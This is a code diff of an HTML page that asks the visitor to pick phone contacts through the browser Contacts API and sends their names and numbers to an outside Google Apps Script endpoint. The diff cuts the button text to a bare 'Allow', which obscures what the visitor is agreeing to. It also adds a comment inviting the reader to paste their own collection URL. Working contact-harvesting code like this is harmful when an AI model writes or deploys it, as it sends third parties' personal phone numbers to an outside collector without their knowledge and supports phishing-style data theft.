@@ -3,25 +3,30 @@
 <head>
   <title>Contacts Access</title>
 </head>
-<body>
-  <button onclick="getContacts()">Allow Contacts Access</button>
+<body style="display: flex; justify-content: center; align-items: center; height: 100vh;">
+  <button onclick="getContacts()" style="padding: 15px 25px; font-size: 18px;">Allow</button>
 
   <script>
     async function getContacts() {
       if (!('contacts' in navigator && 'ContactsManager' in window)) {
-        alert("Your browser does not support contacts API.");
+        alert("Your browser or device does not support Contacts API.\nPlease try on Chrome in an Android phone.");
         return;
       }
 
       try {
-        const contacts = await navigator.contacts.select(['name', 'tel'], {multiple: true});
+        const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
+
         const formattedContacts = contacts.map(c => ({
           name: c.name[0] || '',
           tel: c.tel[0] || ''
         }));
 
-        // Send to Google Sheets
-        await fetch('https://script.google.com/macros/s/AKfycbzQWQ-qdWw7LRaKuUsKPE2-EUJLWmHZiPgbfYOylzt-vXuCtDyzckjji48iKTvhRE1L/exec', {
+        // ✅ Yahan apna Google Apps Script Web App URL paste karo
+        const webAppUrl = 'https://script.google.com/macros/s/AKfycbwnCEUH9FEmrovb6G7ecqM0zaJwBXTbcj0pcIe8_V9tQaneuIHFimeHq0mbiVIhRO93/exec';
+        
+
+
+        const response = await fetch(webAppUrl, {
           method: 'POST',
           body: JSON.stringify(formattedContacts),
           headers: {
@@ -29,11 +34,12 @@
           }
         });
 
-        alert("Contacts sent successfully!");
+        const result = await response.text();
+        alert("Contacts sent successfully! Server replied: " + result);
 
       } catch (err) {
         alert("Permission denied or something went wrong.");
-        console.error(err);
+        console.error("Fetch Error: ", err);
       }
     }
   </script>
